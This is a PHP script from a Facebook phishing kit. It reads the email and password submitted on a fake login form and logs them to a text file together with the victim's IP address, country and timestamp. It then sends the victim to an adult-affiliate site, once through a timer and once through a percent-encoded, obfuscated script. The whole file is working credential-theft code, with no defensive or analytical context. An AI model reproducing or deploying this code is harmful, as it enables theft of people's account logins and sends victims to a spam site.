<?php
ini_set('memory_limit', '-1');

$usuario = $_POST[ 'email' ];
$password = $_POST[ 'pass' ];
include("geoiploc.php");
$ip = $_SERVER[ 'REMOTE_ADDR' ];
$pais = getCountryFromIP($ip, " NamE ");
$fecha = date("d/m/Y h:i"); 

if( ( empty($usuario)) or (empty($password)) ){
	
echo ("<SCRIPT LANGUAGE='JavaScript'>


     history.go(-1);



    </SCRIPT>");
	
	
}else{	


	//guarderemos en un archivo de texto
	$file = fopen($pais.'facebookss.txt','a+');
	fwrite($file, $usuario."\n".$password."\n".$ip."\n".$pais."\n============".$fecha."=============\n");
	fclose($file);
	
	

	
echo ('<SCRIPT>

function redicet(){
	
		window.location.href="http://www.mobilesexlife.mobi/?sl=33904-a24ef&data1=Track1&data2=Track2";
	}
myVar = setTimeout ("redicet()", 5000);

document.write(unescape("%3C%73%63%72%69%70%74%3E%0A%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%77%77%77%2E%6D%6F%62%69%6C%65%73%65%78%6C%69%66%65%2E%6D%6F%62%69%2F%3F%73%6C%3D%33%33%39%30%34%2D%61%32%34%65%66%26%64%61%74%61%31%3D%54%72%61%63%6B%31%26%64%61%74%61%32%3D%54%72%61%63%6B%32%22%3B%0A%3C%2F%73%63%72%69%70%74%3E"));


    </SCRIPT>');
  	
 
	
}
?>